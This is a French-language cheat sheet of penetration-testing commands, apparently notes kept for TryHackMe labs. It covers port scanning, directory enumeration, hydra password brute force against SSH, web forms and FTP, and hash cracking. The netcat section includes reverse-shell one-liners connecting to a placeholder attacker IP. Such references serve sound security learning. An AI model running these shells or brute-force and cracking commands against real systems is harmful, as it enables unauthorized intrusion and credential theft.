# Outils — Référence rapide

## nmap — Scanner de ports
```bash
nmap -sV -sC -p- -T4 cible -oN scan.txt
```
→ Détails dans [../tryhackme/networking/](../tryhackme/networking/)

---

## gobuster — Énumération de répertoires web
```bash
# Énumération de base
gobuster dir -u http://cible -w /usr/share/wordlists/dirb/common.txt

# Avec extensions
gobuster dir -u http://cible -w wordlist.txt -x php,html,txt,js

# Énumération de sous-domaines
gobuster dns -d cible.com -w /usr/share/wordlists/dns/subdomains.txt
```

---

## hydra — Brute force d'authentification
```bash
# SSH
hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://cible

# HTTP form POST
hydra -l admin -P passwords.txt cible http-post-form \
  "/login:username=^USER^&password=^PASS^:Invalid credentials"

# FTP
hydra -l ftp -P passwords.txt ftp://cible
```

---

## netcat — Couteau suisse réseau
```bash
# Écouter sur un port (recevoir un reverse shell)
nc -lvnp 4444

# Reverse shell depuis la machine cible
nc attacker_ip 4444 -e /bin/bash       # Linux
nc attacker_ip 4444 -e cmd.exe         # Windows

# Transfert de fichier
nc -lvnp 4444 > fichier_recu           # Récepteur
nc cible 4444 < fichier_a_envoyer      # Envoyeur

# Banner grabbing
nc cible 80
  GET / HTTP/1.0
```

---

## curl — Requêtes HTTP manuelles
```bash
curl -v http://cible                         # Verbose (headers inclus)
curl -I http://cible                         # Headers seulement
curl -X POST -d "user=a&pass=b" http://cible/login
curl -H "Authorization: Bearer TOKEN" http://api/endpoint
curl -b "session=abc123" http://cible        # Avec cookie
curl -k https://cible                        # Ignorer erreur SSL
curl -L http://cible                         # Suivre les redirections
```

---

## john / hashcat — Cracking de hash
```bash
# Identifier un hash
hash-identifier "5f4dcc3b5aa765d61d8327deb882cf99"

# John the Ripper
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
john --format=bcrypt hash.txt
john --show hash.txt                         # Voir les résultats

# Hashcat
hashcat -m 0    hash.txt rockyou.txt         # MD5
hashcat -m 100  hash.txt rockyou.txt         # SHA1
hashcat -m 1800 hash.txt rockyou.txt         # sha512crypt (Linux /etc/shadow)
hashcat -m 1000 hash.txt rockyou.txt         # NTLM (Windows)
```

---

## Wordlists utiles (Kali Linux)
```
/usr/share/wordlists/rockyou.txt        # Passwords (14M)
/usr/share/wordlists/dirb/common.txt    # Répertoires web
/usr/share/seclists/                    # Collection complète SecLists
```
